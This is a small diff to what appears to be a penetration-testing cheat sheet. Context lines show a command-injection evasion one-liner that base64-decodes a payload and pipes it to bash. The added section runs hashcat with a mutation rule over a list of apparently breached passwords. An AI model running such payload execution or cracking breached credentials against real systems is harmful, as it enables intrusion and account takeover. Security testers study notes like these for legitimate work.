@@ -17,3 +17,9 @@ echo${IFS}<BASE64-Encoded-Payload>|base64${IFS}-d|bash
 ```
 https://pastebin.com/UycbfwRP
 ```
+## Password list
+Download: https://github.com/clem9669/hashcat-rule/blob/master/clem9669_medium.rule
+```
+# mohammad_threats2022 (sample in PassFromBreach.txt )
+hashcat -r clem9669_medium.rule --stdout PassFromBreach.txt > output.txt
+```
